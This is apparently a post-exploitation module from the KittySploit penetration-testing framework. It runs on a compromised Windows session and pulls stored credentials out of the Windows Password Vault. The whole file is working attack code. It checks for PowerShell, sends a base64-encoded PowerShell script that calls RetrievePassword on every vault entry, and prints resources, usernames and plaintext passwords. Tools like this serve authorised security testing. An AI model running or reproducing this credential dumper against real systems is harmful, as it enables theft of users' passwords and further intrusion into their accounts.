#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
import base64
import re


class Module(Post):
    __info__ = {
        "name": "Windows Gather Password Vault Credentials",
        "description": (
            "Extract credentials stored in the Windows Credential Manager "
            "(Password Vault) on a Windows shell or Meterpreter session."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1555/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 2,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
        },
    }

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        output = self.cmd_execute(command)
        return output.strip() if output else ""

    def _encode_powershell(self, script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def _run_powershell(self, script: str) -> str:
        encoded = self._encode_powershell(script)
        return self._execute_cmd(f"powershell -NoP -NonI -EncodedCommand {encoded}")

    def _powershell_script(self) -> str:
        return r"""
function Get-PasswordVault {
    [CmdletBinding()]
    Param()

    try {
        Add-Type -AssemblyName System.Security
        [void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType = WindowsRuntime]
        $vault = New-Object Windows.Security.Credentials.PasswordVault

        $entries = $vault.RetrieveAll() | ForEach-Object {
            $_.RetrievePassword()
            [PSCustomObject]@{
                Resource = $_.Resource
                UserName = $_.UserName
                Password = $_.Password
            }
        } | Sort-Object Resource

        if (-not $entries) {
            Write-Output "No credentials found in the Windows Password Vault."
            return
        }

        $entries | Format-Table -AutoSize | Out-String
    }
    catch {
        throw "Password Vault extraction failed: $($_.Exception.Message) (PowerShell 5.1 + Windows 8/10/11 required)"
    }
}
$ErrorActionPreference = 'Stop'
Get-PasswordVault
"""

    def check(self):
        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
        if "1" not in ps_check:
            print_error("PowerShell is not available on the target")
            return False
        return True

    def run(self):
        if not self.check():
            raise ProcedureError(FailureType.NotCompatible, "PowerShell is not available on the target")

        print_status("Extracting Windows Password Vault credentials...")
        result = self._run_powershell(self._powershell_script())

        if not result:
            raise ProcedureError(FailureType.Unknown, "No output was returned by Get-PasswordVault")

        if re.search(r"Password Vault extraction failed", result, re.I):
            print_error(result)
            raise ProcedureError(FailureType.NotCompatible, result)

        if re.search(r"No credentials found", result, re.I):
            print_warning(result)
            return True

        print_success("Password Vault dump completed")
        print_info(result)
        return True
